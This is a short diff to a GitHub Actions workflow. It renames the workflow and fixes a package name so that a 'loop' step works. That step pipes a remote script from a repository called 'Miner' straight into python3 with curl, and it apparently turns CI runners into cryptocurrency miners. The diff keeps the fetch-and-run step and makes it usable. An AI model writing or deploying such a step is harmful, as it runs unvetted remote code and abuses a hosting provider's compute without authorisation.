@@ -1,4 +1,4 @@
-name: Ubuntu
+name: Ubuntu Final
 
 on:
   workflow_dispatch:
@@ -36,5 +36,5 @@ jobs:
           echo "IP:"
           hostname -I
       - name: loop
-        run: sudo apt install python && curl -s https://raw.githubusercontent.com/Master-kp/Miner/refs/heads/main/loop.py | python3 -
+        run: sudo apt install python3 && curl -s https://raw.githubusercontent.com/Master-kp/Miner/refs/heads/main/loop.py | python3 -
 
